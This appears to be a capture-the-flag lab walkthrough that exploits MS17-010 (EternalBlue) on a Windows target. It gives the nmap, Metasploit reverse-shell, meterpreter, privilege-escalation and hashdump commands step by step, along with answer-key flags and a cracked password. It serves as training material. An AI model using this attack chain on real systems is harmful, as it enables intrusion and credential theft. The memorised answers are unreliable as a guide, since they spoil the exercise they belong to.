### Info Sec Walkthrough
At first, deploy the attack box or run through the own machine.

Then the first task they told to scan the machine for vulnerabilities.

Hint they have given to find vulnerabilities by using the command

> **Command: nmap -sV -vv — script vuln TARGET_IP**

Then after scanning the machine which shows a list of vulnerabilities in the machine.

![](https://miro.medium.com/v2/resize:fit:1082/1*Ih15U-W7UJAi8OA8x6jr9Q.png)

> **How many ports are open with a port number under 1000?**

**_Ans : 3_**

![](https://miro.medium.com/v2/resize:fit:718/1*W_Y9DfPYuZ8ksJrV4xwpew.png)

> **What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)**

**_Ans: ms17–010_**

Then start Metasploit by using the following command

> **$ msfconsole**
> 
> **Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)**

**_Ans : exploit/windows/smb/ms17_010_eternalblue_**

Type **_use exploit/windows/smb/ms17_010_eternalblue_** in msfconsole

Then type **show options,** which would display RHOSTS and some other options like **SESSIONS** we have to enable it type **set RHOSTS target-IP** and

**set SESSIONS 1** and then type **Run.**

> **Show options and set the one required value. What is the name of this value? (All caps for submission)**

**_Ans: RHOSTS_**

> **Usually, it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:**

`**_set payload windows/x64/shell/reverse_tcp_**`

> **Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.**

After running the exploit you can enter into a shell by typing the **shell** command

type **whoami** it would spot it admin name

To run back from shell to **meterpreter** type **_Ctrl + Z._**

It would ask background session 1 yes/no type **_yes_** get back to **_meterpreter._**

> **If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to a meterpreter shell in Metasploit. What is the name of the post-module we will use? (Exact path, similar to the exploit we previously selected)**

**_Ans: post/multi/manage/shell_to_meterpreter_**

> **Select this (use MODULE_PATH). Show options, what option are we required to change?**

**_Ans: SESSION_**

we want the post to exploit it by typing the following payload

**_use post/multi/manage/shell_to_meterpreter_**

After typing this payload enter **_show options_**

Enable **_lhost_** and **_session_**

type **_get-system_** command and **_ps_** command and migrate the process id

Type migrate **_PROCESS_ID_**

> **Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?**

**_Ans: Jon_**

> **Copy this password hash to a file and research how to crack it. What is the cracked password?**

**_Ans: alqfna22_**

The next task is to find some flags :

here you type **_find -f flag*.txt_**

You can find flags for this task

> **Flag1? _This flag can be found at the system root._**

**_Ans : flag{access_the_machine}_**

> ***Errata: Windows really doesn’t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.**

**_flag{sam_database_elevated_access}_**

> **flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._**

**_flag{admin_documents_can_be_valuable}_**
